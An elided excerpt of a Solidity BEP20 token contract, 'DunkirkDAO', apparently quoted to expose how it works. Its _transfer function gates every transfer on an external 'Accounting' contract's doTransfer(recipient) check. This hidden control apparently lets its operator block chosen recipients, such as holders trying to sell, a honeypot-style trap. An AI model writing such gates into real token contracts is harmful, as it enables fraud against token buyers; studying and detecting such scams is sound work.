...
interface Accounting {
    function doTransfer(address to_) external view returns (bool);
}
...
abstract contract BEP20 is IBEP20, Ownable {
  ...
  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
      ...
      require (Accounting(accounting).doTransfer(recipient), "BEP20: couldn't account the transfer");
...
contract DunkirkDAO is BEP20 {
    using SafeMath for uint256;

    constructor(uint256 mintAmount_) BEP20("DunkirkDAO", "DUNK", 9) {
        _mint(msg.sender, mintAmount_ * 1000000000);
    }
